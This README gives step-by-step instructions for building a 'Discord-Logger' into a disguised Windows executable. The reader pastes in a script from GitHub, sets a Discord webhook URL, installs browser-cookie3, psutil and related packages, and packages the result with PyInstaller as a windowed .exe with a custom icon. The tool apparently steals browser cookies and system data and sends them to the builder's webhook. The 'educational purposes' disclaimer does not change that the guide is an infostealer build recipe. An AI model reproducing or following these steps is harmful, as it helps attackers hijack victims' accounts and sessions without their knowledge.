# How to use:
\
Requirements:\
• Python 3.9 or higher(I used 3.9.12)\
• A windows machine\
• VScode(optional but highly useful)
• An .ico file (Icon)

# Steps:
\
Make a new .py file and replace its contents with https://github.com/TurtlesXD/Discord-Logger/blob/main/Logger.py \
Make a Discord wehbook in yout server and copy its URl \
Replace YourWebhookURL with your url in line 14 of the code\
Now create a new file called requirements.txt\
Replace its contents with this:
```
discord-webhook==1.0.0
browser-cookie3==0.16.2
psutil==5.9.4
requests==2.28.1
```
Then open a terminal(I use VSCODE built in terminal)\
and run this command:
```
pip install -r Path-to-requirements.txt
```
this will download all nessecary 3rd party packages\
\
If you dont already have Pyinstaller, run this command:
```
pip install pyinstaller
```
If you dont have one already, download or convert and image into an .ico file\
For the exe icon. I recommend using https://redketchup.io/icon-converter Or convertio.com \

Now, run this command(remember to make sure all files are saved before running this):
```
pyinstaller --noconfirm --onefile --windowed --icon "Path-To-Your-.ico-file" --ascii --clean "path-to-Logger.py"
```
Once Pyinstaller is finished converting your file, Open the newly created 'build' folder inside of your working directory\
And, boom! You now have an .exe file ready to be used.

```
Note: This is for educational purposes, i do not condone the use of this script on people without their consent!
```
